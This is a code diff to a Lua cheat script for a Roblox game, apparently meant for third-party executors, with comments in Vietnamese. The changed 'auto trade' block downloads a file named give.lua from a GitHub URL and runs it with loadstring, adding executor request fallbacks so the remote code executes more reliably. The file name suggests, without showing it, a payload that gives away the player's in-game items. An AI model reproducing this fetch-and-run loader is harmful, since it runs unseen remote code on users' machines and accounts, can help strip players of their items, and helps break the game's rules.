@@ -44,16 +44,45 @@ local FruitCmds = require(Library.Client.FruitCmds)
 local PlayerPet = require(Library.Client.PlayerPet)
 
 -- ==========================================
--- 🔄 TÍCH HỢP AUTO TRADE (LOAD TỪ GITHUB)
+-- 🔄 TÍCH HỢP AUTO TRADE (LOAD TỪ GITHUB) - FIX LỖI DELTA
 -- ==========================================
 task.spawn(function()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
+        local codeString = ""
+        
+        -- Dùng request tiêu chuẩn của executor thay vì game:HttpGet để tránh lỗi trả về số
+        local httprequest = (request or http_request or syn and syn.request)
+        if httprequest then
+            local response = httprequest({
+                Url = "https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua",
+                Method = "GET"
+            })
+            if response.StatusCode == 200 then
+                codeString = response.Body
+            else
+                error("Mã lỗi mạng: " .. tostring(response.StatusCode))
+            end
+        else
+            -- Dự phòng nếu executor không hỗ trợ request
+            codeString = game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua")
+        end
+        
+        -- Đảm bảo dữ liệu tải về chắc chắn là chuỗi văn bản mới đem đi thực thi
+        if type(codeString) == "string" then
+            local loadedScript, compileErr = loadstring(codeString)
+            if loadedScript then
+                loadedScript()
+                print("[AT + AUTORANK] !")
+            else
+                error("Lỗi cú pháp trong file Github: " .. tostring(compileErr))
+            end
+        else
+            error("game:HttpGet trả về sai kiểu dữ liệu: " .. type(codeString))
+        end
     end)
+    
     if not success then
-        warn("[AT ERROR]" .. tostring(err))
-    else
-        print("[AT + AUTO RANK]!")
+        warn("[AT ERROR]: " .. tostring(err))
     end
 end)
 
